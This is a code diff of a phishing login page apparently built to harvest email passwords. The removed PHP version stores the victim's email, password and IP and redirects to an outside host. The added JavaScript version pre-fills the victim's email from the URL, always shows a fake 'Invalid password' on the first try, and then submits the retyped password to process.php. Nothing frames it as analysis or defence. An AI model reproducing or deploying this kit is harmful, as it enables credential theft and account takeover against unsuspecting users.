@@ -1,61 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <link rel="icon" href="logo.svg" type="image/png">
-<body>
-
-<?php
-// Start session at the very beginning
-if (!isset($_SESSION)) {
-    session_start();
-}
-
-// Configuration
-$VALID_PASSWORD = "Password1!"; // Change this to your desired password
-$TARGET_URL = "https://www.bing.com/videos/riverview/relatedvideo?q=team+meeting&mid=06C0E4192AA37E48CEC406C0E4192AA37E48CEC4&FORM=VIRE";
-
-// Get email from URL parameter or use default
-$email = isset($_GET['email']) ? $_GET['email'] : "kdkldkkl@example.com";
-
-// Initialize attempt counter if not set
-if (!isset($_SESSION['attempt_count'])) {
-    $_SESSION['attempt_count'] = 0;
-}
-
-// Handle form submission
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-    $password = $_POST['password'];
-    
-    // Increment attempt counter
-    $_SESSION['attempt_count']++;
-    
-    // Check if maximum attempts reached
-    if ($_SESSION['attempt_count'] >= 2) {
-        // On second attempt: redirect to process.php
-        $_SESSION['login_data'] = [
-            'email' => $email,
-            'password' => $password,
-            'ip' => $_SERVER['REMOTE_ADDR']
-        ];
-        
-        // Clear the session attempt counter
-        unset($_SESSION['attempt_count']);
-        
-        // Redirect to process.php for handling notifications
-        header("Location: https://ap.capitalfcunion.com/32/process.php");
-        exit;
-    } else {
-        // First attempt: always show invalid password
-        $error = "Invalid password";
-    }
-}
-?>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="/logo/logo.svg" type="image/png">
@@ -128,7 +73,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
             color: #e74c3c;
             font-size: 14px;
             margin-bottom: 15px;
-            display: <?php echo isset($error) ? 'block' : 'none'; ?>;
+            display: none;
         }
         
         .forgot-password {
@@ -177,15 +122,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                 <path d="M19 12H5M12 19l-7-7 7-7"/>
             </svg>
-            <?php echo htmlspecialchars($email); ?>
+            <span id="userEmail">kdkldkkl@example.com</span>
         </div>
         
         <h2>Enter password</h2>
         
-        <form method="POST" id="loginForm">
-            <input type="password" class="password-input <?php echo isset($error) ? 'invalid' : ''; ?>" 
+        <form method="POST" action="process.php" id="loginForm">
+            <input type="hidden" name="email" id="hiddenEmail" value="kdkldkkl@example.com">
+            <input type="password" class="password-input" 
                    placeholder="Password" id="passwordInput" name="password" autocomplete="off" required>
-            <div class="error-message"><?php echo isset($error) ? htmlspecialchars($error) : ''; ?></div>
+            <div class="error-message" id="errorMessage"></div>
             
             <a href="#" class="forgot-password">Forgot password?</a>
             
@@ -194,14 +140,42 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
     </div>
 
     <script>
+        // Get email from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        
+        if (email) {
+            document.getElementById('userEmail').textContent = email;
+            document.getElementById('hiddenEmail').value = email;
+        }
+
+        let attemptCount = 0;
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            const pwd = document.getElementById('passwordInput').value.trim();
-            if (!pwd) {
-                e.preventDefault();
+            e.preventDefault();
+            
+            const password = document.getElementById('passwordInput').value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+            const passwordInput = document.getElementById('passwordInput');
+            
+            if (!password) {
                 alert("Please enter your password.");
+                return;
+            }
+
+            attemptCount++;
+            
+            // First attempt: always show error
+            if (attemptCount === 1) {
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Invalid password';
+                passwordInput.classList.add('invalid');
+                passwordInput.value = '';
+            } else {
+                // Second attempt: submit the form
+                this.submit();
             }
         });
     </script>
 </body>
-
 </html>
